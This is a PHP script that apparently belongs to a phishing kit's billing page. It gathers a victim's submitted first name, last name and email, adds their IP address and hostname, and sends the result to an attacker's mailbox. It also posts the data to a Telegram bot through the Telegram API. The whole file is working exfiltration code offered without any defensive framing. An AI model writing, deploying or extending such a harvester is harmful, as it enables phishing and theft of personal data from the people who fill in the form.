<?php

error_reporting(0);
session_start();
include "../config.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

	$_SESSION["name"]= $_POST['firstName']." ".$_POST['lastName'];

$hostname = gethostbyaddr($ip);
$message = "[========== RZLT(Billing)  ===========]\r\n";
$message .= "|Full Name       : ".$_POST['firstName']." ".$_POST['lastName']."\r\n";
$message .= "|Email      	 : ".$_POST['email']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_POST['name'].") Billing  RZLT $ip";
$headers = "From: [CH1 **]<info@CH1.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


?>